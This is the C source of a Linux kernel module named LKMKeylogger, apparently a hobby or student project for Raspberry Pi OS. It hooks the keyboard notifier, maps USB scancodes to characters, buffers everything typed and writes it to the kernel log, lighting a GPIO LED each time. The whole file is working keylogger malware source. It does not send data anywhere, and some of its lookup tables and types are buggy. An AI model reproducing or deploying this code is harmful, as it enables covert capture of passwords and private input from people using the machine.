/*
 ============================================================================
 Name        : LKMKeylogger.c
 Author      : Patrick Collins
 Email	     : Contact@paddylonglegs.site
 Version     : 1.0
 Copyright   : © 2023 Patrick Collins <Contact@paddylonglegs.site>
 License     : GPL v2
 Description : LKM USB Keylogger for Raspberry Pi OS (formerly Raspbian)
 ============================================================================
 */

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/gpio.h>

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("Patrick Collins <Contact@paddylonglegs.site>");
MODULE_DESCRIPTION("Sniff and store keys pressed on the system");
MODULE_VERSION("1.0");

//Assign LED GPIO Pin
static unsigned int Led = 23;

//Array to store user keystrokes
char keystrokes[4095];
bool caps = false;
int capsCheck = 0;

static int keylogger(struct notifier_block *nblock,
		unsigned long code,
		void *_param);

/*
   Scancode sources:
   https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
   http://www.quadibloc.com/comp/scan.htm
   sudo showkey --scancodes
 */

/*	UK USB SCANCODES [Second HEX is with Shift held]
	` 0x29 0xa9 ¬
	1 0x02 0x82 ! 
	2 0x03 0x83 "
	3 0x04 0x84 £
	4 0x05 0x85 $
	5 0x06 0x86 %
	6 0x07 0x87 ^
	7 0x08 0x88 &
	8 0x09 0x89 *
	9 0x0a 0x8a (
	0 0x0b 0x8b )
	- 0x0c 0x8c _
	= 0x0d 0x8d +
      DEL 0x0e 0x8e
      TAB 0x0f 0x8f
	q 0x10 0x90 Q 
	w 0x11 0x91 W
	e 0x12 0x92 E
	r 0x13 0x93 R
	t 0x14 0x94 T
	y 0x15 0x95 Y
	u 0x16 0x96 U
	i 0x17 0x97 I
	o 0x18 0x98 O
	p 0x19 0x99 P
	[ 0x1a 0x9a {
	] 0x1b 0x9b }
     CAPS 0x3a 0xba	
	a 0x1e 0x9e A
	s 0x1f 0x9f S
	d 0x20 0xa0 D
	f 0x21 0xa1 F
	g 0x22 0xa2 G
	h 0x23 0xa3 H
	j 0x24 0xa4 J
	k 0x25 0xa5 K
	l 0x26 0xa6 L
	; 0x27 0xa7 :
	' 0x28 0xa8 @
	# 0x2b 0xab ~
    SHIFT 0x2a 0xaa 
	\ 0x56 0xd6 |
	z 0x2c 0xac Z
	x 0x2d 0xad X
	c 0x2e 0xae C
	v 0x2f 0xaf V
	b 0x30 0xb0 B
	n 0x31 0xb1 N
	m 0x32 0xb2 M
	, 0x33 0xb3 <
	. 0x34 0xb4 >
	/ 0x35 0xb5 ?
	SHIFT 0x36 0xb6
	LCtrl 0x1d 0x9d
	   PI 0x7d 0xfd
	  Alt 0x38 0xb8
	SPACE 0x39 0xb9
	ALTGR 0x64 0xe4
	RCtrl 0x61 0xe1
	LEFT  0x69 0xe9
	UP    0x67 0xe7
	DOWN  0x6c 0xec
	RIGHT 0x6a 0xea
 */

static const char* usb_keyboard_scancodes[64] = {
	0x29, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 
	0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c,  
	0x3a, 0x1e, 0x1f, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x2b, 
	0x2a, 0x56, 0xac, 0x2d, 0x2e, 0x2f, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36,  
	0x1d, 0x7d, 0x38, 0x39, 0x64, 0x61, 0x69, 0x67, 0x6c, 0x6a};

static const char* usb_keyboard_shift_scancodes[64] = {
	0xa9, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 
	0x8f, 0x90, 0X91, 0X92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9a, 0x9b, 0x1c,  
	0x3a, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5, 0xa6, 0xa7, 0xa7, 0xab, 
	0xaa, 0xd6, 0x2c, 0xad, 0xae, 0xaf, 0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6,  
	0x9d, 0xfd, 0xb8, 0xb9, 0xe4, 0xe1, 0xe9, 0xe7, 0xec, 0xea};

static const char* convert[64] = {
	"`","1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", " DELETE ", 
	" TAB ","q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", " ENTER ",  
	" CAPS ", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "#",
	" SHIFT ", "\\","z", "x", "c", "v", "b", "n", "m", ",", ".", "/", " SHIFT ",
	" LCtrl ", " PI ", " Alt ", " ", " Alt Gr ", " RCtrl ", " LEFT ", " UP ", " DOWN ", " RIGHT "};

static const char* convertShift[64] = {
	"¬", "!", """", "£", "$", "%", "^", "&", "*", "(", ")", "_", "+", " DELETE ", 
	" TAB ","Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", " ENTER ",  
	" CAPS ", "A", "S", "D", "F", "G", "H", "J", "K", "L", ":", "@", "~",
	" SHIFT ", "\\","Z", "X", "C", "V", "O", "N", "M", "<", ">", "?", " SHIFT ",
	" LCtrl ", " PI ", " Alt ", " ", " Alt Gr ", " RCtrl ", " LEFT ", " UP ", " DOWN ", " RIGHT "};

static struct notifier_block keylogger_notify = {
	.notifier_call = keylogger,
};

/*
	Displays user keystrokes 
	Turns on LED to notify successful Kernel print
	Empties the keystrokes array for next set user input
*/
int send(void)
{
    printk(KERN_INFO "Keystrokes:");
    printk(KERN_CONT "[%s]", keystrokes); //print continuous line of keystrokes

    if (!gpio_is_valid(Led)){
    	 printk(KERN_INFO "LKMKeylogger: invalid GPIO\n");
		 return -ENODEV;
    }
	gpio_set_value(Led, 1);
	if(gpio_get_value(Led)==1){
		printk(KERN_INFO "Successful\n");
		gpio_set_value(Led, 0);
	}
	else{
		printk(KERN_INFO "Unsuccessful\n");
	}

    //cleanup
    strcpy(keystrokes, "");
    return 0;
}

/*
    keylogger - keypress callback, called when a keypress event occurs.
    Returns NOTIFY_OK
*/
int keylogger(struct notifier_block *nblock,
		  unsigned long code,
		  void *_param)
{
	struct keyboard_notifier_param *param = _param; //get keystrokes from user
	size_t te = sizeof(usb_keyboard_scancodes)/sizeof(usb_keyboard_scancodes[0]);
	size_t n = sizeof(keystrokes)/sizeof(keystrokes[0]);
	size_t con = sizeof(convert)/sizeof(convert[0]);
	int a;
	int c;
	int r;
	size_t leng;
	size_t crashCheck = strlen(keystrokes);

	/* Store only when a key is pressed down */
	if(!(param->down)){
		return NOTIFY_OK;
	}

	pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
		 code, param->down, param->shift, param->value);

	if (param->value == usb_keyboard_scancodes[27]) // Enter Scancode Pressed
	{ 
		char* s = convert[27];
		leng = strlen(s);
		strcat(keystrokes,s);
        	send();
		return NOTIFY_OK;
	}

	if(param->value == 0x3a && caps == true) //User wants CAPS off
	{
		caps = false;
		capsCheck++;
	}
	if(param->value == 0x3a && caps == false && capsCheck<1) //User wants CAPS on
	{
		caps = true;
	}
	capsCheck = 0;

	if(param->value == usb_keyboard_scancodes[13] && crashCheck>0) //User has deleted something previously entered
	{
		char replace[n];
		strcpy(replace, ""); //ensure the array is a string
		size_t r = sizeof(replace)/sizeof(replace[0]);

		size_t del = strlen(keystrokes)-1; //length of string to keep
		strncpy(replace,keystrokes,del); //copy 

		replace[del] = '\0'; //adding null character to convert into string

		strcpy(keystrokes, ""); //resetting array to copy replacement string
		strcpy(keystrokes, replace); // copy replacement string into keystrokes array

		return NOTIFY_OK;
	}

	for(c=0;c<te;c++) ////LOOP THROUGH ALL SCANCODES
	{	
		if(param->shift == 0x00 && param->value == usb_keyboard_scancodes[c] && param->value != usb_keyboard_scancodes[13] && caps == false) //MATCHING SCANCODE in a col and row
		{
			char* s = convert[c];
			leng = strlen(s);
			if(crashCheck+leng<n) //no overflow
			{
				strcat(keystrokes,s); //concatenate new key onto string
			}
			else if(crashCheck+leng>n) //overflow - reset
			{
				send(); //force keystrokes to print and empty
				strcat(keystrokes,s); //concatenate new key onto string
			}
		}
		if(param->shift == 0x01 && param->value != usb_keyboard_scancodes[13] || caps == true) //Convert scancode to corresponding shift vlaue
		{
			if(param->value == usb_keyboard_scancodes[c] && param->value != usb_keyboard_scancodes[13])
			{
				char* s = convertShift[c];
				leng = strlen(s);
				if(crashCheck+leng<n) //no overflow
				{
					strcat(keystrokes,s);
				}
				else if(crashCheck+leng>n) //overflow - reset
				{
					send(); //force keystrokes to print and empty
					strcat(keystrokes,s);
				}
			}
		}

	}
}

/*
   keylogger_init - module entry point
   Initialise keyboard notifier to call the keylogger when an event occurs
 */
static int __init keylogger_init(void)
{
	printk("Keylogger Loaded\n");

	gpio_direction_output(23, 0);
	gpio_set_value(Led, 0);

	register_keyboard_notifier(&keylogger_notify);
	return 0;
}

/**
 * keylogger_exit - module exit function
 * Turns off LED and frees the assigned GPIO pin
 * Unregisters the module from the kernel
 */
static void __exit keylogger_exit(void)
{
	unregister_keyboard_notifier(&keylogger_notify);
	gpio_set_value(23, 0);
   	gpio_unexport(23);
	gpio_free(Led);
        printk("Keylogger Unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

